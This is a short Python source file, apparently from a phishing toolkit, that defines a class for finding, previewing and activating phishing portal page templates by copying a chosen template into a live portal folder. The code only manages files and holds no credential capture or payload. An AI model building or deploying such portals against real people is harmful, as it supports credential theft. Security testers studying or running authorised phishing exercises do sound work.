import os
import shutil
from pathlib import Path

PORTAL_DIR = Path("./phishing_portal")
TEMPLATE_DIR = Path("./phishing_templates")

class PortalTemplateManager:
    def __init__(self, portal_path=PORTAL_DIR, template_path=TEMPLATE_DIR):
        self.portal_path = portal_path
        self.template_path = template_path
        self.templates = self.discover_templates()

    def discover_templates(self):
        templates = []
        if not self.template_path.exists():
            self.template_path.mkdir(parents=True)
        for folder in self.template_path.iterdir():
            if folder.is_dir() and (folder / "index.html").exists():
                templates.append(folder.name)
        return templates

    def list_templates(self):
        return self.templates

    def preview_template(self, name):
        preview_file = self.template_path / name / "preview.png"
        return preview_file if preview_file.exists() else None

    def activate_template(self, name):
        selected_path = self.template_path / name
        if not selected_path.exists():
            raise FileNotFoundError(f"Template '{name}' not found.")
        if self.portal_path.exists():
            shutil.rmtree(self.portal_path)
        shutil.copytree(selected_path, self.portal_path)
        print(f"[*] Activated phishing portal template: {name}")    
